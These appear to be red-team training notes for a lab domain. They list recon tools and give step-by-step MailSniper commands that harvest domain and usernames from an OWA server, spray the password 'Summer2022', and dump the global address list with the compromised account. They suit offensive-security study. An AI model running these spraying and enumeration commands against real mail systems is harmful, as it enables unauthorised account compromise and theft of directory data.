# Cobalt Strike 
- see cobalt strike file 

# External Recon Tools

- whois 
- dig
- dnscan
- other osint tools known

# Initial compromise (DISABLE WINDOWS DEFENDER ON ATTACKER MACHINE) 

-Mail Sniper 
-namesmash.py

**Used for attacking OWA Exchange service at MAIL DOMAIN that was found during the external recon.**

**Technique: Password Spraying**

>PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1

##### Enumerate the NetBIOS name of the target domain with Invoke-DomainHarvestOWA.

>PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

##### Next, we need to find valid usernames from the list of users enumerated from https://cyberbotic.io.

>ubuntu@DESKTOP-3BSK7NO ~> cd /mnt/c/Users/Attacker/Desktop/
>ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> cat names.txt
*We could potentially skip this step if we knew the email address format from somewhere like hunter.io.*

##### Invoke-UsernameHarvestOWA uses a timing attack to validate which (if any) of these usernames are valid.

>PS C:\Users\Attacker> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

##### MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).

>PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

##### PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt

>PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt

##### If there are names here that we didn't find during initial recon, we can go back and do another round of spraying against them.









